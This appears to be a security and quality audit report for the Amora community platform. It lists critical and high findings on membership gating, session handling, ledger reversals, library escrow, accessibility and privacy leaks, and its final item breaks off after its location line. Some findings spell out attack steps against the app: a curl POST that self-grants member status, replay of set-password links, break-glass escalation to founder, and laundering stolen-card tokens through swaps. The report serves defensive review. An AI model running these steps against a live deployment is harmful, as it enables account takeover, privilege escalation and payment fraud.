
## CRITICAL (9)

### Anyone can self-grant the "member" stage (and its money capabilities) with one unauthenticated form POST
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/server/index.ts:1460` · lens: ?
- **What:** hasMembership() decides membership by scanning submissions for any row with type 'membership-508' whose data.email string matches the user's email; `membershipGranted` is never written by any code path, so that unverified string match IS membership, and POST /api/forms/submit (server/index.ts:2820) is public, unauthenticated, accepts arbitrary `type` and `data`, and has no approval step.
- **Failure:** Register normally (stage = guest). Then `curl -X POST https://host/api/forms/submit -H 'Content-Type: application/json' -d '{"type":"membership-508","data":{"email":"me@example.com"}}'` with your own registered address. computeStage (index.ts:1493) now returns 'member', so STAGE_UNLOCKS (shared/capabilities.ts:65) grants exchange.buy, exchange.swap, stay.member_rate, forum.post and map.contact, and getStage('member').gratitudeMultiplier goes 1 -> 2, doubling your sending budget and therefore your weight in the lunar value-pool split. The same POST aimed at someone else's registered email promotes THEM without their knowledge. No audit row, no admin decision, nothing in the pulse.

### A dropped request or a 5xx permanently deletes the member's session token
- **Where:** `client/src/contexts/AuthContext.tsx:63` · lens: ?
- **What:** validateToken() treats every non-ok response AND every thrown fetch error as "this token is invalid" and does localStorage.removeItem("amora-auth-token"); only a 401/403 means that. A timeout, a DNS failure, an offline moment, a 502 while the server runs boot migrations, or a 429 all wipe the credential.
- **Failure:** A member walks to the far side of the land where coverage drops, taps the Amora bookmark on her phone. GET /api/profile rejects with TypeError: Failed to fetch. The catch at line 63 deletes the token from localStorage and sets user=null. Signal returns; she reloads and is still signed out, because the token is gone from the device — she must re-type her password on a phone, and if she was onboarded via SetPassword and does not remember it she is locked out. The same thing happens to every logged-in member simultaneously during a 30-second Railway restart, because a 502 takes the else branch at line 60.

### Exchange reversal claws back tokens the buyer never received, driving them negative
- **Where:** `server/index.ts:2667` · lens: ?
- **What:** The exchange reversal handler unconditionally posts `order.quantity` from the member to the treasury with `allowNegative: true`, without ever checking whether the `exchange_purchase` leg (`ord:{id}:leg1`) actually posted — the exact violation ARCHITECTURE.md §3.8 rule 5 was written to prevent ("Reversal claws back only what was delivered"). The commerce handler got its `wasDelivered` guard (index.ts:2549); exchange did not.
- **Failure:** Treasury holds 0 of token X. A member buys 100 X. The webhook fires: the settle handler sets `exchange_orders.status='paid'` (2644), writes the `fiat_charges` row (2651), then `settleExchangeOrder` throws "treasury cannot cover order" (exchange.ts:413). Stripe retries for ~3 days; nobody restocks; Stripe gives up. The member paid and received nothing, so they dispute. `charge.dispute.created` matches the `fiat_charges` row, the exchange reversal handler runs, and posts mem:{user} -> sys:treasury for 100 X with allowNegative. Result: the member's balance is -100 X for tokens they never held, they are auto-suspended from purchasing across every fiat module, and the treasury now shows 100 X of sellable stock that was never issued. `checkLedgerInvariants` passes — conservation nets to zero and `payment_reversal` is whitelisted for negatives — so nothing ever flags it.

### No password reset, no password change, no "forgot password" — a forgotten password permanently locks a member out of their contribution record
- **Where:** `client/src/pages/Login.tsx:121` · lens: ?
- **What:** `makeSetPasswordToken` (server/index.ts:931) is called from exactly two places, both inside `POST /api/admin/bootstrap` (server/index.ts:3111, 3141). There is no member-facing reset route, no admin route to issue a reset link (the only admin player routes are GET list, PUT stage, DELETE — server/index.ts:9836-9877), no change-password endpoint (grep for `newPassword`/`currentPassword` across server and client returns nothing), and no "Forgot password?" link on the sign-in form. The Admin UI has no button that mails a set-password link either.
- **Failure:** A resident on a phone in rural Costa Rica forgets her password six months after joining, with 40 consented quests and a token balance on her account. She taps Sign In, gets "Invalid credentials", and there is no link to recover. She tries Register instead and gets "Email already exists" (server/index.ts:3013) with no next step. A steward opens Admin → Players and finds only "Change stage", "Change role", and "Delete player". The only route back into her own account is for an admin to DELETE the account — which the confirm dialog itself says "removes their account" — and have her re-register as a new Guest, losing her stage, roles, badges and wallet identity.

### There is no UI anywhere to create, edit or delete a quest, while the Setup Wizard tells a new village its quests are already handled
- **Where:** `client/src/pages/Admin.tsx:6000` · lens: ?
- **What:** The server exposes full quest CRUD (`POST/PUT/DELETE /api/admin/quests`, server/index.ts:8972-9004) but no client file calls any of them (grep `admin/quests` in client/src returns nothing). The admin nav's "The Game" group (Admin.tsx:222-243) has `quest-claims` and no quest editor; the "Content" group (Admin.tsx:15-22) covers journeys, circles and roles only. Meanwhile the Setup Wizard's section 4 is subtitled "Rewrite the words, questions, milestones, and quests for your project" (Admin.tsx:6090) and its Quests row says "Your quest library is seeded; review and reward completions here" (Admin.tsx:6000), pointing at Quest Claims — a consent queue that cannot author anything.
- **Failure:** A founder forks the repo for an ecovillage in Portugal, completes the whole Setup Wizard, ticks section 4 "Done", and opens /quests. The board shows Amora's seeded quests (server/seeds/quests-seed.json): "Welcome Ambassador — Every visitor who feels welcomed is a potential member of the Amora Family for life" and "Food Forest Tender — grows the food that feeds the village and builds our ARI score". Their members start claiming another village's quests, referencing another village's family and score. The founder searches every one of the 30+ admin tabs and finds no way to delete or rewrite a single one; the only path is curl against /api/admin/quests or editing the seed JSON and redeploying.

### A failed library escrow post permanently refuses every future boot, with no in-app repair path
- **Where:** `server/lib/library.ts:308` · lens: ?
- **What:** reserveItem commits the loan row (carrying escrow_credits = N) in one transaction and then posts the escrow in a *separate* transaction; the compensating DELETE only runs when postTransfer returns `!r.ok`, not when it throws. assertLibraryInvariants (library.ts:538, called unconditionally at index.ts:2263) throws `refusing to serve` whenever balance(sys:library-escrow) != SUM(escrow_credits) over live loans, and 'reserved' is in LIVE_LOAN_STATUSES (line 83).
- **Failure:** A member taps Borrow on a hammer worth 40 credits. The item is claimed and the loan row commits with escrow_credits=40. The escrow postTransfer hits ER_LOCK_WAIT_TIMEOUT (or the container is restarted mid-deploy) — postTransfer rethrows, so the compensating DELETE/UPDATE never runs. The DB now expects 40 in escrow and holds 0. On the next deploy or restart, assertLibraryInvariants throws before any route mounts: the entire village — quests, gratitude, stays, login — is down, and the only fix is hand-editing MySQL, because the admin routes that could cancel the loan never mount.

### Every fork's outbound email is sent from Amora's domain, and no caller can override it
- **Where:** `server/index.ts:1879` · lens: ?
- **What:** `sendResendEmail` defaults `from` to `"Amora Site <notifications@amora.cr>"`, and not one of the nine call sites (1532, 2856, 2864, 3114, 3144, 4169, 8621, 8629) ever passes `from` — so `notifications@amora.cr` is the sender for every fork, with no env var, game variable, or brand-overlay field to change it.
- **Failure:** Village #2 follows FORK_RUNBOOK exactly: creates a Resend account, verifies its own sender domain (SPF+DKIM), sets `RESEND_API_KEY`. An admin bootstraps a founder → Resend rejects the send 403 (`domain amora.cr is not verified on this account`) → the error is swallowed at line 1890 into `console.error("[RESEND ERROR]")`. Every claim link, every set-password link, every notification digest fails identically and silently. The fork believes email works because it did the documented DNS work; members never receive anything and the only signal is a log line nobody reads.

### The Member stage hangs off a submissions row that the daily retention sweep deletes, silently demoting members
- **Where:** `server/index.ts:1460` · lens: ?
- **What:** `hasMembership()` (index.ts:1460) returns true only if `user.membershipGranted` is set — and that field is written nowhere in the entire codebase (grep finds only this read) — or if a `submissions` row of type `membership-508` with a matching email still exists. `runRetentionSweep()` (index.ts:1610) keeps only submissions whose `status === "new"`, deleting every *handled* one after `retention.submissions_days` (default 365). `DELETE /api/admin/submissions/:id` removes one instantly. The "member" stage is the rule gate for forum.post, map.contact, stay.member_rate, exchange.buy and exchange.swap (shared/capabilities.ts:65-76) and doubles the gratitude multiplier (gameConfig.ts:201). Because `computeStage` takes the max satisfied stage, the harm lands hardest on the newest members — anyone without a consented quest yet.
- **Failure:** Ana signs the Love Letter in Jan 2026; a steward marks the submission 'accepted' (diligence is what triggers the bug — an ignored submission stays 'new' and survives). 365 days later the daily sweep deletes the row. Ana drops from Member to Participant: her forum posts now return "Posting opens at the member stage", her sending budget halves from 200 to 100, and she can no longer buy tokens. She is never notified and, per the next defect, nothing is logged anywhere.

### Exchange dispute claws back tokens that were never delivered, driving a member negative and handing the treasury phantom stock
- **Where:** `server/index.ts:2676` · lens: ?
- **What:** The commerce reversal handler checks `settled_periods` before clawing back (index.ts:2545-2560, with a long comment explaining exactly why), but the exchange reversal handler posts `mem:<user> -> sys:treasury` for `order.quantity` unconditionally with `allowNegative: true` and `source: "payment_reversal"` — a source that is in `ALLOW_NEGATIVE_SOURCES`, so the ledger cannot refuse it. The exchange settle path records the fiat charge (index.ts:2652) BEFORE calling `settleExchangeOrder`, which throws when the treasury is short (server/lib/exchange.ts:412), so a disputable `fiat_charges` row with a real payment intent routinely exists for an order whose `ord:<id>:leg1` ledger leg never posted. The stays reversal (index.ts:2627) has the same unconditional shape.
- **Failure:** sys:treasury holds 0 `credits`. A member buys 500 credits for $50 through Stripe. The webhook sets exchange_orders.status='paid', writes fiat_charges with the payment intent, then settleExchangeOrder throws "treasury cannot cover"; Stripe retries for three days and gives up; nobody restocks. The member disputes the charge. charge.dispute.created matches the fiat_charges row by payment intent, the exchange reversal runs, and 500 credits move from mem:<user> (balance 0) to sys:treasury with allowNegative. Result: the member's credits balance is -500 for tokens they never held, sys:treasury holds 500 credits that were never minted and are sellable to the next buyer, the boot conservation check still sums to zero so nothing fires, and the member is now blocked from swapping ("a member who owes the village anywhere settles that first") and suspended from purchasing.


## HIGH (62)

### Every nav and footer link fails AA contrast (3.19:1 and 2.35:1)
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/components/Layout.tsx:70` · lens: ?
- **What:** The site-wide header and footer put `text-white/70` and `text-white/50` on `bg-teal-deep` (#157f7d). Measured: white at 70% over #157f7d = 3.19:1, at 50% = 2.35:1, at 80% = 3.68:1 — all below the 4.5:1 AA floor for the 14px normal-weight text they are applied to (91 occurrences of text-white/50|60|70 across client/src). This is not a corner case; it is the primary navigation and the whole footer on all 45 routes.
- **Failure:** A member with mild age-related contrast loss opens /quests on a phone outdoors. The nav links (Home, Circles, Roles, Quests, Wallet, Forum, Map…) at Layout.tsx:70–201 render at 3.19:1 and the footer's 'Your Journey'/'Governance'/'Resources' link columns (lines 420–575) at the same ratio; the copyright and 'Built with Pura Vida' lines (580–585) render at 2.35:1. Sampling any of those with a contrast checker against #157f7d returns a WCAG 1.4.3 AA failure. Raising the header links to solid `text-white` and the de-emphasised text to at least white/85 fixes it.

### The brand amber (#ecb163) as text or button surface is 1.6–2.5:1 — unreadable, and used 157 times
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/pages/Register.tsx:218` · lens: ?
- **What:** `text-amber` resolves to #ecb163 (index.css:78, 282). On white it is 1.90:1; on the auth pages' near-white gradient it is 1.63:1. The inverse pairing `bg-amber text-teal-deep` is 2.53:1. Both are far below the 4.5:1 AA floor, and the codebase already contains an AA-safe warm token (`--color-gold: #a06b1c`, index.css:81, commented '6.2:1 contrast vs white') that these call sites do not use. `text-amber` appears 157 times in client/src.
- **Failure:** A visitor lands on /register and wants to sign in instead. The alternate-action button at Register.tsx:215-222 is `border-2 border-amber text-amber font-semibold` on the page's #eaeeed gradient: its label 'Sign In' measures 1.63:1. The mirror-image button on /login (Login.tsx:123-130, 'Create Account') is identical — so on the two pages every single member must pass through, the secondary way forward is effectively invisible to anyone with low vision. Same failure on the header/footer 'Main Site' CTA (Layout.tsx:236-243, bg-amber + text-teal-deep = 2.53:1) and on the village map's 'This seat is open — raise your hand' button (VillageMap.tsx:342-345).

### 117 form controls app-wide have no programmatic label; the gratitude amount field has no accessible name at all
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/pages/GratitudeWall.tsx:104` · lens: ?
- **What:** Only three `<label>` elements in the whole client carry `htmlFor` (Login.tsx:74, 92; Profile.tsx:168). 117 others — in Register, ProposeQuest, SwapCard, Feedback, Visit, WorkWithUs, LoveLetter, NotifyPrefsPanel and 62 in Admin — are bare `<label className=…>` siblings that are visually adjacent but not associated, so the control they describe announces as 'edit text, blank'. Worse, several controls have no name from any source: GratitudeWall's amount input has no label, no placeholder and no aria-label; QuestActions.tsx:94/101, Feed.tsx:118 and GuideChat.tsx:138 rely on placeholder text only, which is not a label and disappears on input.
- **Failure:** A blind member on VoiceOver opens /gratitude (a core, always-on module) to thank someone. Tabbing the send form (GratitudeWall.tsx:93-115) she hears: 'edit text, blank' (the recipient email), then 'spin button, 10' with no name whatsoever (the amount — how much of her finite monthly budget she is about to give), then 'edit text, blank' (the message). She has no way to know which field is which or that the 10 is a quantity of value. Adding id/htmlFor pairs (and a visually-hidden label on the amount field) is the same one-line fix already applied to Login.

### Action results and refusals are never announced — 25+ sites, only the login page has a live region
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/components/SwapCard.tsx:171` · lens: ?
- **What:** `grep role="alert"|aria-live` across client/src returns exactly one application-level hit (Login.tsx:57) plus two shadcn primitives. Every other success/failure message is a plain `<p>` inserted into the DOM: SwapCard.tsx:165 and :171, Wallet.tsx:78-79, Library.tsx:74-75, Stay.tsx:99-100, Badges.tsx:73, Contribute.tsx:96-97, Register.tsx:94, ProposeQuest.tsx:324, Forum.tsx:130 and :403, VillageMap.tsx:380, GratitudeWall.tsx:116, Feed.tsx:122, QuestActions.tsx:134, ExitPolicy.tsx:81-82, Network.tsx:114, Feedback.tsx:86. Screen readers do not announce silently inserted content, so the state change is invisible to AT.
- **Failure:** A blind member confirms a token swap. The posted price has moved, so the server returns QUOTE_STALE; SwapCard.tsx:143-147 replaces the quote and sets error to 'The price moved while you were deciding — this is the trade as it stands now.' That sentence renders at line 171 with no live region, the Confirm button re-enables at the same position, and nothing is spoken. The member believes the tap missed and presses Confirm again — now executing an irreversible swap at a price they were never told about, on the one screen in the app whose own header comment says 'the member reads the whole trade before they can confirm it'. Same silence on Wallet purchases, Library deposit escrows and Stay bookings.

### role="img" on the village-map SVG deletes every keyboard-operable node from the accessibility tree
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/pages/VillageMap.tsx:114` · lens: ?
- **What:** The SVG root is `<svg role="img" aria-label="Village map">`. In ARIA, `img` is a role whose children are presentational: user agents prune the entire subtree from the accessibility tree. So the `role="button" tabIndex={0} aria-label=…` circles added at lines 138-152 and 164-177 — the fix that made the map keyboard-operable — are announced to a screen reader as nothing at all; the whole picture collapses to 'Village map, image'. Separately, the role nodes at line 166 carry `focus:outline-none` with no replacement focus style (unlike the circle nodes at line 140, which add `focus-visible:stroke-teal-deep`), so a sighted keyboard user tabbing through role seats sees no focus indicator at all (WCAG 2.4.7).
- **Failure:** A blind member is told 'the map is how we explain who holds what — start there.' She opens /map with NVDA. Every circle and every role seat is inside the role="img" subtree, so browse mode reports a single graphic named 'Village map' and virtual-cursor navigation finds no children; the 12 focusable buttons are unreachable by NVDA's element list. Removing role="img" (or moving the accessible name to `<title>`/aria-labelledby and leaving the root as a plain grouping) restores the nodes. Meanwhile a sighted keyboard user Tab-cycling the desktop map cannot tell which role seat is focused.

### The desktop 'Your Path' nav dropdown opens on hover only and is keyboard-dead
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/components/Layout.tsx:75` · lens: ?
- **What:** The dropdown state is driven exclusively by `onMouseEnter`/`onMouseLeave` on the wrapper div (lines 78-79). The `<button>` at line 81 has no onClick, no onKeyDown, no aria-expanded, no aria-haspopup and no aria-controls. Enter and Space on it do nothing, and the four path links (lines 94-109) are never inserted into the DOM for a keyboard or touch user. There is also no dismiss-without-moving-the-pointer path (WCAG 1.4.13).
- **Failure:** A member using only a keyboard (or a switch device, or a screen reader on a desktop ≥1280px) tabs the header, lands on 'Your Path', presses Enter, then Space: pathsOpen stays false, no menu renders, and the next Tab moves to 'Circles'. The four onboarding journey pages are unreachable from the primary nav, and the button announces as a bare 'Your Path, button' with no state. On a touch laptop the same tap does nothing. Adding onClick toggle + aria-expanded/aria-haspopup and an Escape handler fixes it; the mobile accordion at line 280 already does this correctly.

### Set-password claim links are replayable for their whole 60-minute life and redeeming one revokes nothing
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/server/index.ts:936` · lens: ?
- **What:** readSetPasswordToken() validates only the HMAC and `exp` — there is no nonce table, no single-use marker, and no binding to the account's current passwordHash. POST /api/auth/set-password (line 3173) writes the new hash but does not bump tokenVersion and does not invalidate the claim token, so the same link keeps working until it expires and can overwrite the password again.
- **Failure:** An operator bootstraps the founder; /api/admin/bootstrap deliberately returns claimUrl in the response body (line 3167), so the link sits in the operator's shell scrollback / Railway request log / devtools network tab. The founder opens the email and sets their password at T+5min. At T+40min anyone who can read that response body POSTs the identical token to /api/auth/set-password with their own password: the founder account's hash is overwritten, the attacker receives a fresh session token for the founder, the founder's own session stays alive so nothing looks broken, and because /api/auth/set-password is not under /api/admin it writes no audit row at all — the takeover leaves zero trace.

### There is no password change and no password reset — account recovery does not exist for members
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/server/index.ts:3173` · lens: ?
- **What:** The only routes that ever write passwordHash are /api/auth/register and /api/auth/set-password; the only route that mints a set-password token is /api/admin/bootstrap, which refuses every email except the first founder or BREAK_GLASS_ADMIN_EMAIL (line 3095). There is no /api/auth/forgot, no /api/profile/password, and no admin route to send a member a claim link. The client has no 'forgot password' affordance either (client/src/pages/Login.tsx).
- **Failure:** A resident of two years, on a phone, clears site data or forgets her password. She has no reset link, no admin can issue her one, and login is the only credential path — the account is unreachable permanently. Her contribution log, badges, gratitude history and token balance stay attached to the dead account (conservation forbids deleting the value rows), so she re-registers and her record splits in two. Equally: a member who watches someone read her password over her shoulder has no way to change it.

### BREAK_GLASS_ADMIN_EMAIL is not a second factor: break-glass elevates an existing account to founder with no proof of email control
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/server/index.ts:3095` · lens: ?
- **What:** In the break-glass branch, if a member row already matches the configured address the handler runs `u.role = "founder"` and only mints/emails a claim link when `!user.passwordHash` (line 3110). An account that already has a password is promoted silently — no email is sent, the address is never proven, tokenVersion is not touched, and the standing power never expires. Registration (line 3007) accepts any email with no verification, so the email half of the pair is a string an attacker can occupy.
- **Failure:** A fork sets BREAK_GLASS_ADMIN_EMAIL=steward@village.org as its recovery lever. The address is not yet a member (or its owner's account is compromised). An attacker registers steward@village.org through the open, unverified, unthrottled /api/auth/register, then POSTs /api/admin/bootstrap with the shared ADMIN_PASSWORD. The `bootstrapped` guard is bypassed by the break-glass match, the passwordHash is non-empty so no claim email is sent to anyone, and the attacker's own account becomes founder — full village control from one shared secret, with 'bootstrap:break-glass' as the only audit text.

### Logging out does not end the session, and no member can revoke their own sessions
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/contexts/AuthContext.tsx:106` · lens: ?
- **What:** logout() only removes the localStorage key; there is no server call. Tokens are stateless HMAC blobs valid for TOKEN_TTL_MS = 30 days (server/index.ts:332) with no rotation and no server-side session record, and the only revocation lever is POST /api/admin/users/:id/revoke-sessions (line 3193), which requires an admin. Combined with defect 3 (no password change), a member has no self-service way to end a session at all.
- **Failure:** A member signs in on the communal kitchen tablet to check quests and taps 'Log out'. The token string is still in that browser's storage history / any sync backup and remains valid for 30 days. Whoever recovers it can spend her whole gratitude budget (a real allocation of the value pool), post in the forum as her, book a stay at the member rate and buy tokens as her. She cannot change her password, cannot revoke the token, and must find an admin who is willing to bump her tokenVersion — power over her own identity lives entirely with the admins.

### Mobile drawer stays open after tapping "My Profile" or "Sign In / Register"
- **Where:** `client/src/components/Layout.tsx:367` · lens: ?
- **What:** Every other link in the mobile drawer carries onClick={() => setMobileMenuOpen(false)} (14 of them). The /profile link (367) and the /login link (378) do not. wouter navigates client-side without unmounting Layout, so mobileMenuOpen stays true and the ~600px teal drawer keeps covering the page that just loaded.
- **Failure:** On a 390px phone a signed-in member taps the hamburger, scrolls the drawer, taps "My Profile (Ana)". The URL becomes /profile but the screen still shows the open menu list. Nothing appears to have happened, so she taps it again — and again. The only way out is to notice the X in the header and press it. A logged-out visitor tapping "Sign In / Register" hits the identical dead end on the one link that matters most.

### The village map's node sheet puts its primary action underneath the fixed bottom tab bar
- **Where:** `client/src/pages/VillageMap.tsx:305` · lens: ?
- **What:** NodeCard is a bottom-anchored sheet: `fixed inset-0 z-50 flex items-end` with `max-h-[80vh] overflow-y-auto p-6` and no bottom inset. MobileTabBar is `fixed bottom-0 z-50 h-16` and is portaled to document.body, i.e. after #root in DOM order, so at equal z-index it paints on top of the sheet. The sheet's last 64px + safe-area — where the action buttons and the status line live — is covered.
- **Failure:** A member opens /map on a phone, expands a circle in the accordion, taps a role showing "open call", then taps "This seat is open — raise your hand". The note textarea appears and the "Raise my hand" / "Cancel" row lands at the bottom of the sheet, behind the tab bar. Her thumb tap navigates to /circles instead of raising her hand. The confirmation text at line 380 ("Hand raised — the founding team will be in touch.") is also rendered under the bar, so even a successful send looks like nothing happened. The same geometry hides the "Send" button when contacting a role holder.

### A failed /api/exchange makes the wallet report the member holds nothing
- **Where:** `client/src/pages/Wallet.tsx:87` · lens: ?
- **What:** load() is `.then(r => r.ok ? r.json() : null).then(setData).catch(() => {})`. There is no loading or error state, so `data === null` is indistinguishable from "loaded, and empty". Line 87 then renders "Nothing yet — contribution is where value starts." and line 108 renders "Nothing is listed for purchase right now." The identical pattern lies on Contribute.tsx:117 ("Nothing is offered right now.") and VillageHealth.tsx:182, which prints "0 decision(s) opened by 0 member(s)" on a page whose own header comment says it is "honest above all".
- **Failure:** A member with 340 recognition and 12 stay credits opens /wallet on rural mobile data. The request times out (or the server returns 500). She sees her balances panel say "Nothing yet — contribution is where value starts." with no spinner, no error, and no retry. As far as the screen is concerned her whole contribution record is gone. Nothing on the page distinguishes this from a real zero, so the only recovery is guessing that she should reload.

### When /api/game/me fails, Send is disabled and the member is told her budget has not unlocked yet
- **Where:** `client/src/pages/GratitudeWall.tsx:131` · lens: ?
- **What:** `budget` comes from fetchGameMe(). Its failure path leaves `me` null, so `budget` is undefined. Line 131 disables the submit button on `!budget`, and lines 89-91 render the fallback caption "Your sending budget unlocks as you progress" — a statement about her standing in the village, printed because a network request failed.
- **Failure:** A Sage-stage member with 40 of 50 gratitude left this cycle opens /gratitude on a weak connection. fetchGameMe() fails silently. She types the recipient's email and a paragraph of thanks, and the Send button is greyed out with the message that her budget unlocks as she progresses. She concludes the village has downgraded her, or that she is not allowed to acknowledge people yet. Her typed message stays in the box but can never be sent until she happens to reload with better signal.

### applyAcceptReward creates recognition outside the ledger by incrementing the cached balance
- **Where:** `server/index.ts:1822` · lens: ?
- **What:** `applyAcceptReward` awards `getWorkWithUs().acceptGratitude` (default 100) with `u.recognitionBalance = (u.recognitionBalance ?? 0) + amount` and pushes a contribution row claiming `recognitionEarned: amount`. There is no `postTransfer`, no faucet, no ledger row, no idempotency key. This breaks two stated invariants at once: all movement goes through postTransfer, and the balance is a cache that is recomputed, never incremented.
- **Failure:** An admin marks a work-with-us submission 'accepted' (PUT /api/admin/submissions/:id/status, index.ts:2919). The member's Profile immediately shows +100 recognition and a contribution card reading "recognition earned: 100". `token_ledger` has no matching row, so /api/admin/ledger/... reports the member out of sync. The next real credit — any gratitude received (lib/gratitude.ts:158) or quest consent (index.ts:9174) — assigns `recognitionBalance = credit.toBalance` straight from the recomputed ledger, and the 100 silently vanishes from the member's balance while the contribution card still claims it was earned. Nothing tells the member, and no boot invariant looks at users.recognition_balance.

### The chargeback swap-hold is blind to commerce token packs, so card-bought tokens can be laundered through a swap
- **Where:** `server/lib/exchange.ts:646` · lens: ?
- **What:** `swappableBalance` computes the held amount from `exchange_orders WHERE kind='fiat_purchase' AND status='paid'` only. Commerce `token_pack` products grant the same tokens from the same treasury on the same Stripe rails (`product_grant`, index.ts:2460) but write to `product_purchases`, so they carry a hold of zero. The hold's own stated purpose ("long enough that a chargeback still finds them in the wallet rather than converted into something the village cannot claw back") is defeated by the cheaper door.
- **Failure:** Village lists token X purchasable and swappable, sells a "500 X pack" as a commerce token_pack, and leaves `exchange.swap_fiat_hold_days` at its 45-day default. An attacker buys the pack with a stolen card; settle grants 500 X from treasury. They immediately POST /api/exchange/swap paying 500 X for token Y — `swappableBalance` returns held=0 because no `exchange_orders` row exists, both the pre-flight (7344) and the in-transaction `capGuard` (7401) pass, and the pair posts. They then charge back. The commerce reversal claws back 500 X (member goes to -500 X) but Y is already theirs and unrecoverable, and the village is out 500 Y of real treasury stock plus the Stripe chargeback fee. Buying the identical tokens through /api/exchange/buy would have been frozen for 45 days.

### reserveItem commits the loan before posting escrow, so one interrupted borrow both blocks boot and lets a later settle drain other borrowers' deposits
- **Where:** `server/lib/library.ts:308` · lens: ?
- **What:** The transaction at 285-306 commits the `library_loans` row with `escrow_credits = N`, then posts the escrow leg in a separate autocommit at 308. The compensating cleanup at 322-325 only runs when `postTransfer` returns `ok:false` — a throw (connection loss, deadlock, process death) propagates to the Express error handler and leaves the row behind. `escrowReconciliation` (528) then expects N credits that `sys:library-escrow` never received, and `assertLibraryInvariants` (538) throws "refusing to serve" at every subsequent boot (index.ts:2263).
- **Failure:** Two members are mid-loan with 20 credits each sitting in sys:library-escrow. A third taps "borrow" on a 30-credit-escrow item; the loan row commits, and the `postTransfer` at 308 throws because Railway recycles the DB connection. The request 500s; the loan sits `reserved` with escrow_credits=30 and no deposit taken. Two harms follow. (a) A steward cancels that loan — `settleLoan` computes release = 30 - 0 and posts sys:library-escrow -> mem:{third} for 30. The escrow account holds 40, so the post SUCCEEDS: the third member is paid 30 credits they never deposited, out of the first two members' deposits. (b) At the next deploy, escrowReconciliation reports actual 10 vs expected 40 and the server refuses to start — quests, gratitude and stays all go down with it, and the only remedy is hand-editing MySQL.

### The module manifest is fetched once, anonymously, and never refreshed on login — so members-lifecycle modules stay invisible for the whole session
- **Where:** `client/src/contexts/AuthContext.tsx:74` · lens: ?
- **What:** `ModuleProvider` calls `refresh` exactly once in `useEffect(refresh, [])` (ModuleProvider.tsx:61) and exposes `refresh` for consumers, but nothing in the client ever calls it (grep `.refresh` across client/src returns no call sites). `AuthContext.login`/`register`/`logout` only set React state (AuthContext.tsx:85-110), and Login.tsx:22 navigates with wouter's client-side `navigate("/profile")` — no page load. So `/api/modules` is only ever requested with the anonymous viewer scope.
- **Failure:** A village runs feed, stays, library and wallet at the `members` lifecycle. A new resident opens the site (manifest fetched anonymously → those four modules absent), signs in, and lands on /profile. The header still shows only Home / Your Path / Circles / Roles / Quests — no Feed, Stay, Wallet or Library — because Layout.tsx:124-171 gates each link on `useModule(...)`. She has no way to know those pages exist. If someone sends her the /stay link, Stay.tsx renders `<NotFound />` because `modules.loaded` is true and `stays` is missing, so she sees a red "404 Page Not Found" for a module she is fully entitled to. Only a hard browser refresh fixes it.

### A module that is simply switched off renders a red "404 / Page Not Found — it may have been moved or deleted", with no site navigation and no next step
- **Where:** `client/src/pages/NotFound.tsx:24` · lens: ?
- **What:** Contribute.tsx:57, Network.tsx:74, and the equivalent guards in Stay/Library/Feed/Badges/VillageHealth all `return <NotFound />` when the module is absent from the viewer's manifest. NotFound renders a pulsing red alert circle, the bare code "404", "Sorry, the page you are looking for doesn't exist. It may have been moved or deleted.", and a single blue "Go Home" button. Critically it does not wrap in `<Layout>`, so the header nav and footer disappear entirely — the person is stranded on a dead-end screen. "Off" is a deliberate lifecycle state (shared/modules.ts), not an error, and "may have been deleted" is affirmatively false.
- **Failure:** A village has the library module at `preview` while stewards test it. A member who saw "Library" in the nav yesterday (lifecycle since changed) clicks her bookmark. She gets a full-screen red 404 saying the page may have been deleted, with no header, no footer, and no explanation. She reasonably concludes the platform is broken and messages a steward asking whether the tool library was cancelled. The same screen is what every member sees for /stay, /feed, /wallet, /badges and /contribute on any village where those ship off — which is the default for all nine optional modules.

### Three member-facing pages — Contribute (all money in), Exit Policy ("Leaving Well"), and Village Network — have zero inbound links anywhere in the app
- **Where:** `client/src/components/Layout.tsx:499` · lens: ?
- **What:** Searching every .tsx/.ts in client/src outside App.tsx for `/contribute`, `/exit-policy` and `/network` finds no navigation link at all. Layout's desktop nav (lines 69-244), mobile drawer (273-390) and 5-section footer (404-577) never mention them; `config/mobileNav.ts` TAB_SLOTS and FAB_ACTIONS never mention them; Layout does not even call `useModule("commerce")` or `useModule("network")`. The only references are prose inside the admin panel ("The public page is /contribute", Admin.tsx:6371; "Lives at /exit-policy for everyone to read", Admin.tsx:4940). /seasonal-festivals is reachable only via /project-history, which is reachable only from /journey-to-launch, whose nav link is gated to admin/founder (Layout.tsx:204) — so members cannot reach it either.
- **Failure:** A village turns commerce on and publishes monthly dues plus a build-fund donation as products. Members are told "pay your dues on the site." They open the site, read the header and every footer column, and there is no Contribute, Dues, Pay or Donate link anywhere; the page renders correctly but only for someone who is told to type /contribute. Worse for /exit-policy: the page that documents notice period, unwind steps, valuation method, the involuntary-removal process, and the button "Open my departure process" (ExitPolicy.tsx:156) is unreachable — the platform publishes a leaving policy "before anyone needs it" that nobody can find when they need it.

### A members-only feed micropost's first 60 characters land on the unauthenticated public Pulse
- **Where:** `server/index.ts:3639` · lens: ?
- **What:** moduleActivity() only refuses to emit below the 'members' lifecycle (server/lib/modules.ts:310), but /api/game/pulse (server/index.ts:9828) reads audience='public' with no auth at all — and for a feed micropost (kind='post') title is NULL by construction (server/index.ts:3624), so the Pulse text becomes `<FirstName> started "<first 60 chars of the body>"`.
- **Failure:** A village sets forum+feed lifecycle to 'members' precisely so only signed-in members read them. Ana posts a micropost: "I can't make rent this month and I'm scared to ask the circle for help". `curl https://<village>/api/game/pulse` with no cookie returns `{"text":"Ana started \"I can't make rent this month and I'm scared to ask the c\""}`. The module framework's own promise ("preview/members never leaks") is broken for every micropost, and the same path leaks decision titles and published call-notes titles (server/index.ts:3881, 5970).

### /api/game/gratitude/wall serves member-to-member free-text messages to anonymous visitors, including bodies of members-only feed posts
- **Where:** `server/index.ts:9283` · lens: ?
